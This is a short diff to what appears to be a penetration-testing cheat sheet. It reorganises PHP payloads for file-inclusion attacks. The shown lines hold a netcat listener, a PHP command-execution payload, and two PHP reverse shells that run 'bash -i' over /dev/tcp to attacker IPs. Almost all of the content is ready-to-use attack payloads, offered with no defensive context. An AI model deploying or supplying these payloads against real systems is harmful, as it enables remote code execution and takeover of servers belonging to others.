@@ -53,8 +53,10 @@ nc -nlvp 4444 > file.txt
 
 LFI / RFI
 ----------------
+- <?php phpinfo()?>
 - <?php echo shell_exec(whoami);?>
 - <?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
+- <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
 
 MSSQL / SQLi
 ----------------
@@ -85,7 +87,7 @@ Payload Generation
 PHP
 ----------------
 - https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1
-- <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
+
 
 Priv Esc - Linux
 ----------------
